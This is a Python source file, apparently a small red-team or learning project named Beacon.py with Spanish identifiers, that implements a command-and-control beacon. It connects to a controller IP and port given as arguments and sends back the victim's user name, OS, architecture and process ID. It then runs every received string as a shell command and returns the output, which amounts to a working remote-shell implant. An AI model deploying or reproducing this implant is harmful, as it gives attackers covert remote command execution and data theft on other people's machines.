import os
import platform
import random
import socket
import subprocess
import time
import sys

IPC2 = "localhost"
PUERTOC2 = 54312
tiempo = 1

def RecogerInfoOS():
    InfoTotal = ""
    try:
        InfoTotal+="Usuario:" + os.getlogin() + "\n"
        InfoTotal+="OS:" + platform.system() + "\n"
        InfoTotal+="Arquitectura:" + f"{platform.architecture()[0]} {platform.architecture()[1]}\n"
        InfoTotal+="PID:" + str(os.getpid()) 
    except Exception as error:
        print("error")
    return(InfoTotal)

def IniciarBeacon():
    global tiempo
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IPC2, PUERTOC2))
    s.send("64 70 64".encode())
    print("Enviado codigo de conexion")
    
    datos = s.recv(1024)
    if datos.decode() == "55 44 01":
        print("Enviando Información Inicial")
        s.send(RecogerInfoOS().encode())
        while True:
            datos = s.recv(1024)
            time.sleep(tiempo)
            if datos:
                if datos.decode().split(":")[0]== "BeaconTimeSleepSet":
                    tiempo = int(datos.decode().split(":")[1])
                    print(f"Time changed to {tiempo}")
                if datos.decode().split(":")[0]== "BeaconKillConfirm":
                    print("Your session has been killed by the controller, exiting...")
                    s.close()
                print(f"Received command: {datos.decode()}")
                try:
                    comando = subprocess.run(
                        datos.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                    )
                    resultado = comando.stdout + comando.stderr 
                    print(resultado)
                    if resultado:
                        s.send(resultado.encode())
                except KeyboardInterrupt:
                    s.send(f"Existing beacon {os.getlogin()}")
                    s.close()
                    break
            time.sleep(tiempo)

if __name__=="__main__":
    if len(sys.argv) == 3:  # Check if exactly 3 command-line arguments are provided
        IPC2 = sys.argv[1]   # Note: Command-line arguments start from index 1, not 0
        PUERTOC2 = int(sys.argv[2])
        IniciarBeacon()
    else:
        print("Invalid command\nUsage: python3 Beacon.py [IP] [PORT]\nExample: python3 Beacon.py 192.168.1.23 4544")
